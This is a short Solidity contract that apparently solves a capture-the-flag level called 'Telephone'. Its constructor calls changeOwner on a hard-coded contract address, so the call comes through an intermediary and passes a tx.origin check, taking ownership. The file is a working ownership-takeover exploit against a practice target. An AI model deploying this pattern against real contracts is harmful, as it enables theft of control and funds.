// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITelephone {
    function changeOwner(address _owner) external; 
}

contract Caller {

    ITelephone telephoneSC = ITelephone(0x44B766874aE68d4906CA50D152cA1203AC388A5e);

    constructor() {
        telephoneSC.changeOwner(msg.sender);
    }  
}